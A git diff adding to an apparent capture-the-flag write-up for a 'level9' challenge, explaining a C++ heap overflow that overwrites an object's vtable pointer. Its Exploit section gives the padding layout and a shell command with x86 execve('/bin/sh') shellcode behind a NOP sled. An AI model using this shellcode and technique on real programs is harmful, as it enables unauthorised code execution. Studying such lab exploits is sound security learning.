@@ -61,4 +61,38 @@ Gnu has a tool called c++filt `c++filt _Znwj = operator new(unsigned int)` to de
 All C++ function names are encoded into a low-level assembly label (this process is known as mangling)
 The c++filt program does the inverse mapping: it decodes (demangles) low-level names into user-level names so that the linker can keep these overloaded functions from clashing
 
--- --
+-- Functionnality --
+Ok, static analysis is done (see source.cpp to see my last 8 hours of work)
+It proved quite challenging without prior c++ and reverse c++ knowledge
+But now that its over we can see what the program really is doing, and its really not much :
+- Create two object of the same class that have the same size
+- Set a private property through the constructor
+- Overload the + operator to add both object property
+
+-- Vulnerability --
+Ok now lets understand why we segv on 108 like we saw earlier, run in gdb with few breakpoint and `i f` when we crash
+Ah ! We're segfaulting on main+142 right after the memcpy in setAnnotation, the property was located at the end of the obj, but since we're writing from +4
+We already overwrite the whole obj with 104, the next 4 are the addresses right after in memory
+The issue is we're not overwriting any eip, we're segv because of the virtual call procedure to double dereference
+Our stack pointer is at address 0xbffff580, but we dont store our value here, we store it at 0x0804a008
+and with `i proc m` in gdb, we see that its a heap address, which make sens now that its printed, new malloc the obj
+
+So thats why, 104 was the padding to overwrite the whole obj, 104-108 was to overwrite the heap header
+108-112 was overwriting the first 4 byte of the next obj since its been malloc'd right after
+And in the first 4 byte of the next obj there is the operator+ func ! Which is the thing we're trying to call with the double dereference for the virtual call
+
+-- Exploit --
+We understand where the code is vulnerable, lets build an exploit
+// mov eax, dword [esp+0x10]    ; eax = new_ob
+// mov eax, dword [eax]         ; This is where we segv
+// mov edx, dword [eax]         ;
+This virtual call procedure makes a double reference, and we call the last value, so my previous exploit attempts at the beginning
+Were trying to interpret the /x90/x90/x90/x90 as an address to jump to to begin execution
+Then lets negate this by providing an address to our address, and where do we have the rights to write ? In obj+4
+Lets start the padding by providing the address of our shellcode, that we currently have at the end
+And replace the address at the end with the address of obj+4
+The shellcode i tried at the beginning in this video segv but with another it works !
+
+`scp -P 4242 Ressources/exploit.py level9@127.0.0.1:/tmp/exploit.py`
+`export SHELLCODE=$(python -c "print '\x90'*512 + '\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh'")`
+`./level9 $(python /tmp/exploit.py)`
